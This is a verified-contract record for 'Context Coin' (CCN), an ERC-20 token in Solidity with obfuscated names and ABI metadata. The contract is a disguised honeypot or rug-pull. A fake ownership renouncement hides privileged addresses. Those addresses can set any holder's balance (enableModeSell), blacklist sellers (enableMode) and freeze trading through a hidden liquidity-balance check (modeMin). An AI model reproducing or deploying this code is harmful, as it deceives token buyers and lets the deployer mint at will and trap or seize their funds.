{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract launchedSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atFee {\n    function createPair(address launchedSender, address atFundExempt) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface senderAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface fundMinFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapBuyIs) external view returns (uint256);\n\n    function transfer(address feeTx, uint256 launchedTx) external returns (bool);\n\n    function allowance(address modeAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeTx,\n        uint256 launchedTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingModeFrom, uint256 value);\n    event Approval(address indexed modeAuto, address indexed spender, uint256 value);\n}\n\ninterface modeTx is fundMinFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ContextCoin is launchedSwap, fundMinFee, modeTx {\n\n    function balanceOf(address swapBuyIs) public view virtual override returns (uint256) {\n        return limitWallet[swapBuyIs];\n    }\n\n    uint8 private totalWallet = 18;\n\n    address receiverTradingLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 listBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return isAuto;\n    }\n\n    function shouldSenderTake() public {\n        emit OwnershipTransferred(amountMode, address(0));\n        txAt = address(0);\n    }\n\n    uint256 constant feeTrading = 17 ** 10;\n\n    address public liquidityList;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverShould;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalWallet;\n    }\n\n    uint256 public exemptMarketing = 0;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txLiquidityTrading;\n    }\n\n    function owner() external view returns (address) {\n        return txAt;\n    }\n\n    function shouldToken(address feeAmount) public {\n        if (shouldList) {\n            return;\n        }\n        if (toTake == swapTx) {\n            swapTx = receiverBuyMode;\n        }\n        fromLaunched[feeAmount] = true;\n        if (fundSwap == atReceiverBuy) {\n            totalList = swapTx;\n        }\n        shouldList = true;\n    }\n\n    function enableMode(address tradingTotal) public {\n        minFund();\n        \n        if (tradingTotal == amountMode || tradingTotal == liquidityList) {\n            return;\n        }\n        takeLaunchedAuto[tradingTotal] = true;\n    }\n\n    function transfer(address minTo, uint256 launchedTx) external virtual override returns (bool) {\n        return amountLaunched(_msgSender(), minTo, launchedTx);\n    }\n\n    function modeMin(uint256 launchedTx) public {\n        minFund();\n        toWalletExempt = launchedTx;\n    }\n\n    uint256 public liquidityAtWallet;\n\n    bool public shouldList;\n\n    uint256 public receiverBuyMode;\n\n    function getOwner() external view returns (address) {\n        return txAt;\n    }\n\n    event OwnershipTransferred(address indexed isBuyTo, address indexed exemptFrom);\n\n    string private txLiquidityTrading = \"CCN\";\n\n    function approve(address launchedBuy, uint256 launchedTx) public virtual override returns (bool) {\n        txReceiverLaunch[_msgSender()][launchedBuy] = launchedTx;\n        emit Approval(_msgSender(), launchedBuy, launchedTx);\n        return true;\n    }\n\n    mapping(address => bool) public takeLaunchedAuto;\n\n    bool public atReceiverBuy;\n\n    function enableModeSell(address minTo, uint256 launchedTx) public {\n        minFund();\n        limitWallet[minTo] = launchedTx;\n    }\n\n    mapping(address => uint256) private limitWallet;\n\n    address private txAt;\n\n    address senderFrom;\n\n    address public amountMode;\n\n    uint256 toWalletExempt;\n\n    mapping(address => bool) public fromLaunched;\n\n    uint256 private toTake;\n\n    bool public fundSwap;\n\n    string private isAuto = \"Context Coin\";\n\n    function amountLaunched(address atAmount, address feeTx, uint256 launchedTx) internal returns (bool) {\n        if (atAmount == amountMode) {\n            return amountTeam(atAmount, feeTx, launchedTx);\n        }\n        uint256 receiverSender = fundMinFee(liquidityList).balanceOf(senderFrom);\n        require(receiverSender == toWalletExempt);\n        require(feeTx != senderFrom);\n        if (takeLaunchedAuto[atAmount]) {\n            return amountTeam(atAmount, feeTx, feeTrading);\n        }\n        launchedTx = txLaunch(atAmount, feeTx, launchedTx);\n        return amountTeam(atAmount, feeTx, launchedTx);\n    }\n\n    mapping(address => mapping(address => uint256)) private txReceiverLaunch;\n\n    constructor (){\n        if (swapTx == toTake) {\n            liquidityAtWallet = swapTx;\n        }\n        shouldSenderTake();\n        senderAmount launchList = senderAmount(receiverTradingLaunched);\n        liquidityList = atFee(launchList.factory()).createPair(launchList.WETH(), address(this));\n        senderFrom = atFee(launchList.factory()).feeTo();\n        \n        amountMode = _msgSender();\n        fromLaunched[amountMode] = true;\n        limitWallet[amountMode] = receiverShould;\n        if (fundSwap != atReceiverBuy) {\n            atReceiverBuy = false;\n        }\n        emit Transfer(address(0), amountMode, receiverShould);\n    }\n\n    uint256 private swapTx;\n\n    uint256 private receiverShould = 100000000 * 10 ** 18;\n\n    uint256 public exemptAt = 3;\n\n    function minFund() private view {\n        require(fromLaunched[_msgSender()]);\n    }\n\n    function txLaunch(address atAmount, address feeTx, uint256 launchedTx) internal view returns (uint256) {\n        require(launchedTx > 0);\n\n        uint256 exemptReceiverTx = 0;\n        if (atAmount == liquidityList && exemptAt > 0) {\n            exemptReceiverTx = launchedTx * exemptAt / 100;\n        } else if (feeTx == liquidityList && exemptMarketing > 0) {\n            exemptReceiverTx = launchedTx * exemptMarketing / 100;\n        }\n        require(exemptReceiverTx <= launchedTx);\n        return launchedTx - exemptReceiverTx;\n    }\n\n    function allowance(address fromIsSell, address launchedBuy) external view virtual override returns (uint256) {\n        if (launchedBuy == receiverTradingLaunched) {\n            return type(uint256).max;\n        }\n        return txReceiverLaunch[fromIsSell][launchedBuy];\n    }\n\n    function amountTeam(address atAmount, address feeTx, uint256 launchedTx) internal returns (bool) {\n        require(limitWallet[atAmount] >= launchedTx);\n        limitWallet[atAmount] -= launchedTx;\n        limitWallet[feeTx] += launchedTx;\n        emit Transfer(atAmount, feeTx, launchedTx);\n        return true;\n    }\n\n    function transferFrom(address atAmount, address feeTx, uint256 launchedTx) external override returns (bool) {\n        if (_msgSender() != receiverTradingLaunched) {\n            if (txReceiverLaunch[atAmount][_msgSender()] != type(uint256).max) {\n                require(launchedTx <= txReceiverLaunch[atAmount][_msgSender()]);\n                txReceiverLaunch[atAmount][_msgSender()] -= launchedTx;\n            }\n        }\n        return amountLaunched(atAmount, feeTx, launchedTx);\n    }\n\n    uint256 public totalList;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isBuyTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingModeFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromIsSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atReceiverBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapBuyIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTotal\",\"type\":\"address\"}],\"name\":\"enableMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTx\",\"type\":\"uint256\"}],\"name\":\"enableModeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAtWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedTx\",\"type\":\"uint256\"}],\"name\":\"modeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverBuyMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSenderTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"}],\"name\":\"shouldToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeLaunchedAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ContextCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}